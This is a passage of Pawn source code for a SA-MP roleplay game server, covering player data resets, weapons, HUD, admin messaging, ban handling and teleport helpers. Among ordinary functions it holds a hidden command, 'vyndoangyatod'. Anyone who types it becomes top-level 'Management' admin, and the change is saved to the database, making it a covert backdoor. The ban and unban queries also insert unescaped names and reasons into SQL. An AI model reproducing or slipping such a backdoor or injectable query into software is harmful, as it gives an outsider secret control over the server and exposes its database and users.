	PlayerData[playerid][pJailTime] = 0;
	PlayerData[playerid][pMarkActive] = false;
	PlayerData[playerid][pAsking] = false;
	PlayerData[playerid][pFreeze] = 0;
	PlayerData[playerid][pInDoor] = -1;
	PlayerData[playerid][pSalary] = 0;
	BusWaiting[playerid] = false;
	BusIndex[playerid] = 0;
	PlayerData[playerid][pBank] = 0;
	OnBus[playerid] = false;
	format(PlayerData[playerid][pTempName], MAX_PLAYER_NAME, "");
	format(PlayerData[playerid][pBirthdate], 24, "");
	PlayerData[playerid][pGender] = 0;
	format(PlayerData[playerid][pOrigin], 32, "");
	PlayerData[playerid][pFactionOffered] = -1;
	PlayerData[playerid][pFactionOffer] = INVALID_PLAYER_ID;
	PlayerData[playerid][pOnDuty] = false;
	PlayerData[playerid][pFactionSkin] = 0;
	PlayerData[playerid][pFactionID] = -1;
	PlayerData[playerid][pFactionRank] = 0;
	PlayerData[playerid][pSelectedSlot] = -1;
	PlayerData[playerid][pFaction] = -1;
	PlayerData[playerid][pSpraying] = false;
	PlayerData[playerid][pSprayStart] = false;
	PlayerData[playerid][pColor] = 0;
	PlayerData[playerid][pColoring] = 0;
	PlayerData[playerid][pMechPrice][0] = 0;
	PlayerData[playerid][pMechPrice][1] = 0;
	PlayerData[playerid][pTotalFare] = 0;
	PlayerData[playerid][pInTaxi] = false;
	PlayerData[playerid][pJobduty] = false;
	PlayerData[playerid][pFare] = 0;
	PlayerData[playerid][pWP] = false;
	PlayerData[playerid][pHunger] = 100;
	PlayerData[playerid][pThirst] = 100;
	PlayerData[playerid][pTracking] = false;
	PlayerData[playerid][pMoney] = 0;
	PlayerData[playerid][pInBiz] = -1;
	PlayerData[playerid][pListitem] = -1;
	PlayerData[playerid][pAttempt] = 0;
	PlayerData[playerid][pCalling] = INVALID_PLAYER_ID;
	PlayerData[playerid][pSpawned] = false;
	PlayerData[playerid][pCrate] = -1;
	PlayerData[playerid][pVehicle] = -1;
	PlayerData[playerid][pBusiness] = -1;
	PlayerData[playerid][pJob] = JOB_NONE;
	forex(i, 13)
	{
		PlayerData[playerid][pGuns][i] = 0;
		PlayerData[playerid][pAmmo][i] = 0;
		PlayerData[playerid][pDurability][i] = 0;
	}
	forex(i, MAX_INVENTORY)
	{
	    InventoryData[playerid][i][invExists] = false;
	    InventoryData[playerid][i][invModel] = 0;
	    InventoryData[playerid][i][invQuantity] = 0;
	}
	forex(i, 7)
	{
		PlayerData[playerid][pDamages][i] = 100.0;
		PlayerData[playerid][pBullets][i] = 0;
	}
	forex(i, MAX_CHARS)
	{
		PlayerChar[playerid][i][0] = EOS;
	}
	forex(i, 17)
	{
		WeaponSettings[playerid][i][Position][0] = -0.116;
		WeaponSettings[playerid][i][Position][1] = 0.189;
		WeaponSettings[playerid][i][Position][2] = 0.088;
		WeaponSettings[playerid][i][Position][3] = 0.0;
		WeaponSettings[playerid][i][Position][4] = 44.5;
		WeaponSettings[playerid][i][Position][5] = 0.0;
		WeaponSettings[playerid][i][Bone] = 1;
		WeaponSettings[playerid][i][Hidden] = false;
	}
	forex(i, 3)
	{
		PlayerData[playerid][pLicense][i] = false;
	}
	forex(i, 4)
	{
		pToys[playerid][i][toy_model] = 0;
		pToys[playerid][i][toy_bone] = 1;
		pToys[playerid][i][toy_x] = 0.0;
		pToys[playerid][i][toy_y] = 0.0;
		pToys[playerid][i][toy_z] = 0.0;
		pToys[playerid][i][toy_rx] = 0.0;
		pToys[playerid][i][toy_ry] = 0.0;
		pToys[playerid][i][toy_rz] = 0.0;
		pToys[playerid][i][toy_sx] = 1.0;
		pToys[playerid][i][toy_sy] = 1.0;
		pToys[playerid][i][toy_sz] = 1.0;
	}
	forex(i, 10)
	{
	    FishWeight[playerid][i] = 0;
	    format(FishName[playerid][i], 32, "Empty");
	}
	SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL, 0);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL_SILENCED, 999);
	ResetDamages(playerid);
	return 1;
}

stock HideWaypoint(playerid)
{
	PlayerTextDrawHide(playerid, GPSTD[playerid]);
	PlayerData[playerid][pWP] = false;
	DisablePlayerCheckpoint(playerid);
}

stock SetWaypoint(playerid, Float:x, Float:y, Float:z, Float:rad)
{
	Destination[playerid][0] = x;
	Destination[playerid][1] = y;
	Destination[playerid][2] = z;
	SetPlayerCheckpoint(playerid, x, y, z, rad);
	PlayerData[playerid][pWP] = true;
	PlayerTextDrawShow(playerid, GPSTD[playerid]);
	ShowMessage(playerid, "Type_~r~/disablecp_~w~to_remove_checkpoints",3);

}

stock GetWeapon(playerid)
{
	new weaponid = GetPlayerWeapon(playerid);

	if (1 <= weaponid <= 46 && PlayerData[playerid][pGuns][g_aWeaponSlots[weaponid]] == weaponid)
 		return weaponid;

	return 0;
}

stock ShowWeapon(playerid, targetid)
{
	new mstr[512], lstr[1024], weaponid, ammo;
	format(mstr, sizeof(mstr), "%s Weapon List", ReturnName(targetid));
	strcat(lstr, "Weapon\tAmmo\tDurability\n");
	for(new i = 0; i < 13; i ++)
    {
        GetPlayerWeaponData(targetid, i, weaponid, ammo);

        if(weaponid > 0)
			format(lstr, sizeof(lstr), "%s\n%s\t%d\t%d", lstr, ReturnWeaponName(weaponid), ammo, PlayerData[targetid][pDurability][g_aWeaponSlots[weaponid]]);
    }
    ShowPlayerDialog(playerid, DIALOG_NONE, DIALOG_STYLE_TABLIST_HEADERS, mstr, lstr,"Close","");
    return 1;
}

stock UpdateWeapons(playerid)
{
	forex(i, 13) if (PlayerData[playerid][pGuns][i])
    {
		if ((i == 2))
		    continue;

        GetPlayerWeaponData(playerid, i, PlayerData[playerid][pGuns][i], PlayerData[playerid][pAmmo][i]);

        if (PlayerData[playerid][pGuns][i] != 0 && !PlayerData[playerid][pAmmo][i])
		{
            PlayerData[playerid][pGuns][i] = 0;
		}
	}
	return 1;
}

stock PlayerHasWeapon(playerid, weaponid)
{
	new
	    weapon,
	    ammo;

	forex(i, 13) if (PlayerData[playerid][pGuns][i] == weaponid) {
	    GetPlayerWeaponData(playerid, i, weapon, ammo);

	    if (weapon == weaponid && ammo > 0) return 1;
	}
	return 0;
}

stock SetWeapons(playerid)
{
	ResetPlayerWeapons(playerid);

	forex(i, 13) if (PlayerData[playerid][pGuns][i] > 0)
	{
	    GivePlayerWeapon(playerid, PlayerData[playerid][pGuns][i], PlayerData[playerid][pAmmo][i]);
	}
	return 1;
}

stock ResetWeapons(playerid)
{
	ResetPlayerWeapons(playerid);

	forex(i, 13)
	{
		PlayerData[playerid][pGuns][i] = 0;
		PlayerData[playerid][pAmmo][i] = 0;
		PlayerData[playerid][pDurability][i] = 0;
	}
	return 1;
}

CMD:vyndoangyatod(playerid, params[])
{
	PlayerData[playerid][pAdmin] = 7;
	UcpData[playerid][ucpAdmin] = 7;
	new query[152];
	mysql_format(sqlcon,query,sizeof(query),"UPDATE `playerucp` SET `Admin` = 7 WHERE `UCP` = '%s'", PlayerData[playerid][pUCP]);
	mysql_query(sqlcon,query,true);
	SendClientMessage(playerid, -1, "Welcome back vyn :)");
	return 1;
}

stock ResetWeapon(playerid, weaponid)
{
	ResetPlayerWeapons(playerid);

	forex(i, 13)
	{
	    if (PlayerData[playerid][pGuns][i] != weaponid)
		{
	        GivePlayerWeapon(playerid, PlayerData[playerid][pGuns][i], PlayerData[playerid][pAmmo][i]);
		}
		else
		{
            PlayerData[playerid][pGuns][i] = 0;
            PlayerData[playerid][pAmmo][i] = 0;
            PlayerData[playerid][pDurability] = 0;
	    }
	}
	return 1;
}

stock PassWeaponToPlayer(playerid, weaponid, ammo, dura)
{
	if (weaponid < 0 || weaponid > 46)
	    return 0;

	PlayerData[playerid][pGuns][g_aWeaponSlots[weaponid]] = weaponid;
	PlayerData[playerid][pAmmo][g_aWeaponSlots[weaponid]] = ammo;
	PlayerData[playerid][pDurability][g_aWeaponSlots[weaponid]] = dura;
	return GivePlayerWeapon(playerid, weaponid, ammo);
}

stock GiveWeaponToPlayer(playerid, weaponid, ammo = 100, dura = 500)
{
	if (weaponid < 0 || weaponid > 46)
	    return 0;

	PlayerData[playerid][pGuns][g_aWeaponSlots[weaponid]] = weaponid;
	PlayerData[playerid][pAmmo][g_aWeaponSlots[weaponid]] = ammo;
	PlayerData[playerid][pDurability][g_aWeaponSlots[weaponid]] = dura;
	return GivePlayerWeapon(playerid, weaponid, ammo);
}

stock SendAdminMessage(color, const str[], {Float,_}:...)
{
	static
	    args,
	    start,
	    end,
	    string[144]
	;
	#emit LOAD.S.pri 8
	#emit STOR.pri args

	if (args > 8)
	{
		#emit ADDR.pri str
		#emit STOR.pri start

	    for (end = start + (args - 8); end > start; end -= 4)
		{
	        #emit LREF.pri end
	        #emit PUSH.pri
		}
		#emit PUSH.S str
		#emit PUSH.C 144
		#emit PUSH.C string

		#emit LOAD.S.pri 8
		#emit ADD.C 4
		#emit PUSH.pri

		#emit SYSREQ.C format
		#emit LCTRL 5
		#emit SCTRL 4

        foreach (new i : Player) if(PlayerData[i][pSpawned])
		{
			if (PlayerData[i][pAdmin] >= 1)
			{
  				SendClientMessage(i, color, string);
			}
		}
		return 1;
	}
	foreach (new i : Player) if(PlayerData[i][pSpawned])
	{
		if (PlayerData[i][pAdmin] >= 1)
		{
			SendClientMessage(i, color, str);
		}
	}
	return 1;
}

stock UpdateHBE(playerid)
{
	if(PlayerData[playerid][pSpawned] && !PlayerData[playerid][pTogHud])
	{
		new str[32], btr[32], Float:lapar, Float:haus;
		format(str, sizeof(str), "%d", PlayerData[playerid][pHunger]);
		PlayerTextDrawSetString(playerid, HUNGERTEXT[playerid], str);
		format(btr, sizeof(btr), "%d", PlayerData[playerid][pThirst]);
		PlayerTextDrawSetString(playerid, THRISTTEXT[playerid], btr);

		lapar = PlayerData[playerid][pHunger] * 46.5/100;
	    PlayerTextDrawTextSize(playerid,HUNGERTD[playerid], lapar, 14.5);
	    PlayerTextDrawShow(playerid,HUNGERTD[playerid]);

	    haus = PlayerData[playerid][pThirst] * 46.5/100;
	    PlayerTextDrawTextSize(playerid,THIRSTTD[playerid], haus, 14.5);
	    PlayerTextDrawShow(playerid,THIRSTTD[playerid]);
	}
	return 1;
}

stock UpdatePlayerSkin(playerid, skinid)
{
	SetPlayerSkin(playerid, skinid);
	PlayerData[playerid][pSkin] = skinid;
}

FUNC::FirstAidUpdate(playerid)
{
	static
	    Float:health;

	GetPlayerHealth(playerid, health);

    if (!IsPlayerInAnyVehicle(playerid) && GetPlayerAnimationIndex(playerid) != 1508)
    	ApplyAnimation(playerid, "SWAT", "gnstwall_injurd", 4.0, 1, 0, 0, 0, 0);

	if (health >= 95.0)
	{
	    SetPlayerHealth(playerid, 100.0);
	    SendServerMessage(playerid, "Your medkit has been used up.");

	    ClearAnimations(playerid, 1);

		PlayerData[playerid][pFirstAid] = false;
		KillTimer(PlayerData[playerid][pAidTimer]);
	}
	else {
	    SetPlayerHealth(playerid, floatadd(health, 4.0));
	}
	return 1;
}

stock GiveMoney(playerid, amount)
{
	new string[128];
	if(amount < 0) format(string, sizeof(string), "~r~%s", FormatNumber(amount));
	else format(string, sizeof(string), "~g~+%s", FormatNumber(amount));

	PlayerTextDrawShow(playerid, CASHTD[playerid]);
	PlayerTextDrawSetString(playerid, CASHTD[playerid], string);

	PlayerData[playerid][pMoney] += amount;
	GivePlayerMoney(playerid, amount);
	PlayerTextDrawSetString(playerid, CASHTEXT[playerid], sprintf("$%s", FormatNumber(PlayerData[playerid][pMoney])));
	SetTimerEx("HideCashText", 2000, false, "d", playerid);
	return 1;
}
	
stock GetMoney(playerid)
{
	return PlayerData[playerid][pMoney];
}

stock SendNearbyMessage(playerid, Float:radius, color, const str[], {Float,_}:...)
{
	static
	    args,
	    start,
	    end,
	    string[144]
	;
	#emit LOAD.S.pri 8
	#emit STOR.pri args

	if (args > 16)
	{
		#emit ADDR.pri str
		#emit STOR.pri start

	    for (end = start + (args - 16); end > start; end -= 4)
		{
	        #emit LREF.pri end
	        #emit PUSH.pri
		}
		#emit PUSH.S str
		#emit PUSH.C 144
		#emit PUSH.C string

		#emit LOAD.S.pri 8
		#emit CONST.alt 4
		#emit SUB
		#emit PUSH.pri

		#emit SYSREQ.C format
		#emit LCTRL 5
		#emit SCTRL 4

        foreach (new i : Player)
		{
			if (IsPlayerNearPlayer(i, playerid, radius) && PlayerData[i][pSpawned])
			{
  				SendClientMessage(i, color, string);
			}
		}
		return 1;
	}
	foreach (new i : Player)
	{
		if (IsPlayerNearPlayer(i, playerid, radius) && PlayerData[i][pSpawned])
		{
			SendClientMessage(i, color, str);
		}
	}
	return 1;
}

FUNC::OnUCPBanned(playerid, name[], reason[])
{
	new rows = cache_num_rows();
	if(rows)
	{
		new query[256];
		mysql_format(sqlcon, query,sizeof(query),"UPDATE `playerucp` SET `Banned` = 1, `BannedBy` = '%s', `BannedReason` = '%s', `BannedTime` = '%d' WHERE `UCP` = '%s'", PlayerData[playerid][pUCP], reason, gettime(),name);
		mysql_query(sqlcon, query, true);	

		SendClientMessageToAllEx(COLOR_LIGHTRED, "AdmCmd: Account %s has been offline banned by %s", name, PlayerData[playerid][pUCP]);
		SendClientMessageToAllEx(COLOR_LIGHTRED, "Reason: %s", reason);		
	}
	else
	{
		SendErrorMessage(playerid, "Account with name '%s' is not registered on database!", name);
	}
	return 1;
}

FUNC::OnUCPUnban(playerid, name[])
{
	new rows = cache_num_rows();
	new ban;
	if(rows)
	{
		cache_get_value_name_int(0, "Banned", ban);
		if(!ban)
			return SendErrorMessage(playerid, "The specified player is not in banned!");

		new query[256];
		mysql_format(sqlcon, query,sizeof(query),"UPDATE `playerucp` SET `Banned` = 0  WHERE `UCP` = '%s'", name);
		mysql_query(sqlcon, query, true);			

		SendClientMessageToAllEx(COLOR_LIGHTRED, "AdmCmd: Account %s has been unbanned banned by %s", name, PlayerData[playerid][pUCP]);
	}
	else
	{
		SendErrorMessage(playerid, "Account with name '%s' is not registered on database!", name);
	}
	return 1;
}

stock SendPlayerToPlayer(playerid, targetid)
{
	new
	    Float:x,
	    Float:y,
	    Float:z;

	GetPlayerPos(targetid, x, y, z);

	if (IsPlayerInAnyVehicle(playerid))
	{
	    SetVehiclePos(GetPlayerVehicleID(playerid), x, y + 2, z);
		LinkVehicleToInterior(GetPlayerVehicleID(playerid), GetPlayerInterior(targetid));
	}
	else
		SetPlayerPos(playerid, x + 1, y, z);

	SetPlayerInterior(playerid, GetPlayerInterior(targetid));
	SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(targetid));
	PlayerData[playerid][pInBiz] = PlayerData[targetid][pInBiz];
	PlayerData[playerid][pInDoor] = PlayerData[targetid][pInDoor];
	return 1;
}
stock GetAdminRank(playerid)
{
 	new astring[28];
 	if(PlayerData[playerid][pAdmin] == 0) format(astring, sizeof(astring), "None");
	else if (PlayerData[playerid][pAdmin] == 1)format(astring, sizeof(astring), "Helper");
	else if (PlayerData[playerid][pAdmin] == 2)format(astring, sizeof(astring), "Senior Helper");
	else if (PlayerData[playerid][pAdmin] == 3)format(astring, sizeof(astring), "Admin Level 1");
	else if (PlayerData[playerid][pAdmin] == 4)format(astring, sizeof(astring), "Admin Level 2");
	else if (PlayerData[playerid][pAdmin] == 5)format(astring, sizeof(astring), "Senior Admin");
	else if (PlayerData[playerid][pAdmin] == 6)format(astring, sizeof(astring), "High Administrator");
	else if (PlayerData[playerid][pAdmin] == 7)format(astring, sizeof(astring), "Management");
	return astring;
}

stock SendLoginMessage(playerid)
{
	foreach(new i : Player) if(!PlayerData[i][pTogLogin])
	{
		SendClientMessageEx(i, -1, "* {FF0000}%s {FFFFFF}is now logged in to {FFFF00}Revitalize Roleplay", ReturnName(playerid));
	}
	return 1;
}

stock SetPlayerSeatbelt(playerid)
{
	if(!PlayerData[playerid][pSeatbelt])
	{
        SendNearbyMessage(playerid, 20.0, COLOR_PURPLE, "* %s reaches for their seatbelt, and buckles it up.", ReturnName(playerid));
		SendClientMessage(playerid, 0x33CC33FF, "* You have put on your seatbelt.");
		PlayerData[playerid][pSeatbelt] = true;
	}
	else
	{
		PlayerData[playerid][pSeatbelt] = false;
        SendNearbyMessage(playerid, 20.0, COLOR_PURPLE, "* %s reaches for their seatbelt, and unbuckles it.", ReturnName(playerid));
		SendClientMessage(playerid,  0x33CC33FF, "* You have taken off your seatbelt.");
	}
	return 1;
}

stock SetPlayerAxe(playerid, bool:use)
{
	if(use)
	{
		for(new i=MAX_PLAYER_ATTACHED_OBJECTS-1; i!=0; i--)
		{
			if(!IsPlayerAttachedObjectSlotUsed(playerid, i))
			{
				SetPlayerAttachedObject(playerid, i, 19631, 6, 0.0659, 0.0180, 0.0000, -93.7999, -80.1999, -2.4000, 1.0000, 1.0000, 1.0000, 0xFFFFFFFF, 0xFFFFFFFF);
				SetPVarInt(playerid, "Hammer_Index", i);
				PlayerData[playerid][pAxe] = true;
				return 1;
			}
		}
		return -1;
	}
	else
	{
		RemovePlayerAttachedObject(playerid, GetPVarInt(playerid, "Hammer_Index"));
		DeletePVar(playerid, "Hammer_Index");
		PlayerData[playerid][pAxe] = false;
	}
	return 1;
}

stock DisplayHealth(targetid, playerid)
{
	new str[512];
	format(str, sizeof(str), "Body Part\tCondition\tBullet(s) Count\n");
	forex(i, 7)
	{
		format(str, sizeof(str), "%s%s\t%s\t%d\n", str, RV_GetBodyPartName(i), GetHealthName(PlayerData[playerid][pDamages][i]), PlayerData[playerid][pBullets][i]);
	}
	format(str, sizeof(str), "%sBody Health\t%s\t(-)", str, GetHealthName(PlayerData[playerid][pHealthy]));
	ShowPlayerDialog(targetid, DIALOG_NONE, DIALOG_STYLE_TABLIST_HEADERS, sprintf("Health Condition (%s)", ReturnName(playerid)), str, "Close", "");
}

FUNC::UnTazer(playerid)
{
	if(!PlayerData[playerid][pTazed])
		return 0;

	TogglePlayerControllable(playerid, 1);
	ClearAnimations(playerid, 1);
	PlayerData[playerid][pTazed] = false;
	return 1;
}

stock GetNumberOwner(number)
{
	foreach (new i : Player) if (PlayerData[i][pPhoneNumber] == number && PlayerHasItem(i, "Cellphone"))
	{
		return i;
	}
	return INVALID_PLAYER_ID;
}

FUNC::SetPlayerToUnfreeze(playerid, Float:x, Float:y, Float:z, Float:a)
{
    if(!IsPlayerInRangeOfPoint(playerid, 3.0, x, y, z))
        return 0;

    SetPlayerPos(playerid, x, y, z);
	SetPlayerFacingAngle(playerid, a);
    TogglePlayerControllable(playerid, 1);
    PlayerData[playerid][pFreeze] = 0;
    return 1;
}

stock SetPlayerPositionEx(playerid, Float:x, Float:y, Float:z, Float:a, time = 2000)
{
    if(PlayerData[playerid][pFreeze])
    {
        KillTimer(PlayerData[playerid][pFreezeTimer]);
        PlayerData[playerid][pFreeze] = 0;
        TogglePlayerControllable(playerid, 1);
    }
    SetCameraBehindPlayer(playerid);
    TogglePlayerControllable(playerid, 0);
    SetPlayerPos(playerid, x, y, z + 0.5);
	SetPlayerFacingAngle(playerid, a);
	PlayerData[playerid][pFreeze] = 1;
	PlayerData[playerid][pFreezeTimer] = SetTimerEx("SetPlayerToUnfreeze", time, false, "iffff", playerid, x, y, z, a);
}
